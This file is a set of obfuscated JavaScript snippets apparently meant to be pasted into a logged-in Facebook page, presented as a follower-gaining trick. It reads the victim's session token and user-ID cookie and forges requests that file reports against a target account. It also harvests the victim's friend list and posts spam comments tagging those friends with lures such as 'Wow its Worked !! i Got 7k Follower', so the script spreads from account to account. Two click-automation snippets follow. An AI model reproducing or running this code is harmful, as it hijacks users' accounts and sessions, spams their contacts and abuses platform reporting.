var _0xb161=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x62\x6C\x6F\x63\x6B\x3D\x31\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x63\x74\x69\x6F\x6E\x73\x5F\x74\x6F\x5F\x74\x61\x6B\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x5B\x5D\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x30\x25\x32\x43\x25\x32\x32\x65\x78\x70\x61\x6E\x64\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x66\x69\x72\x73\x74\x5F\x63\x68\x6F\x69\x63\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x32\x43\x25\x32\x32\x66\x72\x6F\x6D\x5F\x67\x65\x61\x72\x25\x32\x32\x25\x33\x41\x25\x32\x32\x74\x69\x6D\x65\x6C\x69\x6E\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x6F\x6E\x5F\x70\x72\x6F\x66\x69\x6C\x65\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x66\x25\x32\x32\x25\x33\x41\x25\x32\x32\x68\x74\x74\x70\x73\x25\x33\x41\x25\x35\x43\x25\x32\x46\x25\x35\x43\x25\x32\x46\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x25\x35\x43\x25\x32\x46\x4E\x61\x6E\x2E\x65\x72\x74\x74\x37\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x34\x35\x25\x32\x43\x25\x32\x32\x72\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41","\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x32\x71\x6D\x76\x75\x35\x6B\x39\x55\x6D\x41\x41\x61\x55\x56\x70\x6F\x26\x5F\x5F\x72\x65\x71\x3D\x75\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x38\x35\x37\x31\x30\x37\x31\x31\x30\x38\x38\x38\x30","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x30\x30\x30\x30\x36\x39\x35\x32\x31\x31\x39\x30\x34\x38"];var fb_dtsg=document[_0xb161[2]](_0xb161[1])[0][_0xb161[0]];var user_id=document[_0xb161[4]][_0xb161[3]](document[_0xb161[4]][_0xb161[3]](/c_user=(\d+)/)[1]);var now=( new Date)[_0xb161[5]]();function Report(_0x45e7x5){var _0x45e7x6= new XMLHttpRequest();var _0x45e7x7=_0xb161[6];var _0x45e7x8=_0xb161[7]+fb_dtsg+_0xb161[8]+_0x45e7x5+_0xb161[9]+_0x45e7x5+_0xb161[10]+now+_0xb161[11]+user_id+_0xb161[12]+user_id+_0xb161[13];_0x45e7x6[_0xb161[15]](_0xb161[14],_0x45e7x7,true);_0x45e7x6[_0xb161[16]]=function (){if(_0x45e7x6[_0xb161[17]]==4&&_0x45e7x6[_0xb161[18]]==200){_0x45e7x6[_0xb161[19]];} ;} ;_0x45e7x6[_0xb161[20]](_0x45e7x8);} ;
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","1422641517996985","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round","Try now! You will get Many Followers too !  ;) @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=Wow its Worked !! i Got 7k Follower ! :D","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7=new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function(){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];};};yorum_yap(id,mesaj);};};};var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);}else{_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);};_0x7892x7[_0xa22c[37]]();};function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];};return _0x7892xa;};function yorum_yap(id,_0x7892xc){var _0x7892xd=new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function(){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];};};_0x7892xd[_0xa22c[37]](_0x7892x8);};arkadaslari_al(id);


javascript:var inputs = document.getElementsByClassName('_26tg _p img'); 
for(var i=0; i<inputs.length;i++) { 
inputs[i].click(); 
}
javascript:var inputs = document.getElementsByClassName('_54nh'); 
for(var i=0; i<inputs.length;i++) { 
inputs[i].click(); 
}

})();
